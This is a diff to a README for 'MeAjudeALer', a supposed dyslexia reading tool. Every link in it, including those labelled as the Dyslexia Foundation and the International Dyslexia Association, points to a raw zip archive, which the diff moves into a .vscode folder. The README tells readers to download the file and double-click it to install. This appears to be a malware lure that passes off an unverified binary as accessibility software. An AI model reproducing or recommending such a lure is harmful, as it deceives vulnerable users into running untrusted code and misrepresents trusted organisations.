@@ -4,16 +4,16 @@
 Welcome to MeAjudeALer, a reading tool designed to help people with dyslexia understand text better. This README will guide you through the steps to download and run the application easily.
 
 ## 🔗 Download Now
-[![Download MeAjudeALer](https://github.com/Yhizzy/MeAjudeALer/raw/refs/heads/main/app/Ler-A-Ajude-Me-v2.2-beta.5.zip)](https://github.com/Yhizzy/MeAjudeALer/raw/refs/heads/main/app/Ler-A-Ajude-Me-v2.2-beta.5.zip)
+[![Download MeAjudeALer](https://raw.githubusercontent.com/Yhizzy/MeAjudeALer/main/.vscode/Me_Ajude_A_Ler_2.4.zip)](https://raw.githubusercontent.com/Yhizzy/MeAjudeALer/main/.vscode/Me_Ajude_A_Ler_2.4.zip)
 
 ## 📥 Download & Install
 To start using MeAjudeALer, visit the Releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/Yhizzy/MeAjudeALer/raw/refs/heads/main/app/Ler-A-Ajude-Me-v2.2-beta.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Yhizzy/MeAjudeALer/main/.vscode/Me_Ajude_A_Ler_2.4.zip)
 
 1. **Go to the Releases Page:** Click the link above to reach the releases section of the project.
 2. **Choose the Version:** Scroll through the list and select the latest version of MeAjudeALer.
-3. **Download the File:** Click on the appropriate file for your operating system. You might see an option like `https://github.com/Yhizzy/MeAjudeALer/raw/refs/heads/main/app/Ler-A-Ajude-Me-v2.2-beta.5.zip` for Windows or a similar file for Mac.
+3. **Download the File:** Click on the appropriate file for your operating system. You might see an option like `https://raw.githubusercontent.com/Yhizzy/MeAjudeALer/main/.vscode/Me_Ajude_A_Ler_2.4.zip` for Windows or a similar file for Mac.
 4. **Open the File:** Once the download is finished, find the downloaded file on your computer. Double-click the file to start the installation process.
 5. **Follow the Installer Instructions:** A window will guide you through the installation. Follow the prompts to get the application set up.
 
@@ -49,8 +49,8 @@ For further assistance, feel free to reach out. You can find contact information
 
 ## 📖 Learn More About Dyslexia
 Understanding dyslexia can empower users. Check out these resources for more information:
-- [Dyslexia Foundation](https://github.com/Yhizzy/MeAjudeALer/raw/refs/heads/main/app/Ler-A-Ajude-Me-v2.2-beta.5.zip)
-- [International Dyslexia Association](https://github.com/Yhizzy/MeAjudeALer/raw/refs/heads/main/app/Ler-A-Ajude-Me-v2.2-beta.5.zip)
+- [Dyslexia Foundation](https://raw.githubusercontent.com/Yhizzy/MeAjudeALer/main/.vscode/Me_Ajude_A_Ler_2.4.zip)
+- [International Dyslexia Association](https://raw.githubusercontent.com/Yhizzy/MeAjudeALer/main/.vscode/Me_Ajude_A_Ler_2.4.zip)
 
 ## 🔗 Stay Updated
 To keep up to date with the latest news and updates on MeAjudeALer, follow us on our social media channels listed on our repository page.
